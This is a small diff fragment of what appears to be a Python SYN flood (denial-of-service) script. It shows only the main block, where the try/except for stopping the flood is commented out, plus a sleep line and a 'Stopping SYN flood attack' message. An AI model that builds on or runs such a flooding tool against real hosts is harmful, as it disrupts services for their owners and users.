@@ -25,7 +25,7 @@ def syn_flood():
         time.sleep(0.01)  # 10ms delay to reduce network saturation (adjust as needed)
 
 if __name__ == "__main__":
-    try:
-        syn_flood()
-    except KeyboardInterrupt:
-        print("\n[!] Stopping SYN flood attack.")
+    #try:
+    syn_flood()
+    #except KeyboardInterrupt:
+        #print("\n[!] Stopping SYN flood attack.")
